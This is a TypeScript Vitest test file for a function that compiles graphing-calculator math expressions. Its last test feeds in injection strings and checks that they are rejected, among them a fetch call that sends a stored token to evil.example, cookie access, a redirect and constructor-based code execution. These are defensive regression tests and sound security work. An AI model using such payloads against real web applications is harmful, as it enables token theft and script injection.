import { describe, expect, it } from 'vitest';
import { compileMathExpression } from './mathExpression';

const at = (expr: string, x: number) => compileMathExpression(expr)?.(x);

describe('compileMathExpression (pre-launch-audit.md A.3)', () => {
  it('evaluates ordinary graphing input', () => {
    expect(at('sin(x)', Math.PI / 2)).toBeCloseTo(1);
    expect(at('y = x^2 + 2x + 1', 3)).toBe(16);
    expect(at('f(x) = 3x', 2)).toBe(6);
    expect(at('2(x+1)', 2)).toBe(6);
    expect(at('(x+1)(x-1)', 3)).toBe(8);
    expect(at('|x|', -4)).toBe(4);
    expect(at('2pi', 0)).toBeCloseTo(2 * Math.PI);
    expect(at('e^x', 1)).toBeCloseTo(Math.E);
    expect(at('2**3', 0)).toBe(8);
    expect(at('2^-1', 0)).toBe(0.5);
    expect(at('-x^2', 2)).toBe(-4);
    expect(at('max(x, 3)', 1)).toBe(3);
    expect(at('7 mod 3', 0)).toBe(1);
    expect(at('log(100)', 0)).toBe(2);
    expect(at('ln(e)', 0)).toBeCloseTo(1);
  });

  it('yields null where the value is not finite, instead of drawing to infinity', () => {
    expect(at('1/x', 0)).toBeNull();
    expect(at('sqrt(x)', -1)).toBeNull();
    expect(at('ln(x)', 0)).toBeNull();
  });

  it('refuses anything that is not maths — this is the whole point', () => {
    // Each of these ran as JavaScript under the previous string rewriter.
    expect(compileMathExpression('(fetch("https://evil.example/?t="+localStorage.getItem("token")),1)')).toBeNull();
    expect(compileMathExpression('document.cookie')).toBeNull();
    expect(compileMathExpression('window.location="https://evil.example"')).toBeNull();
    expect(compileMathExpression('x; alert(1)')).toBeNull();
    expect(compileMathExpression('constructor.constructor("alert(1)")()')).toBeNull();
    expect(compileMathExpression('Math.sin(x)')).toBeNull(); // no member access at all
    expect(compileMathExpression('y')).toBeNull();
    expect(compileMathExpression('constructor')).toBeNull();
    expect(compileMathExpression('toString(1)')).toBeNull();
    expect(compileMathExpression('sin')).toBeNull();
    expect(compileMathExpression('')).toBeNull();
    expect(compileMathExpression('(x')).toBeNull();
  });
});
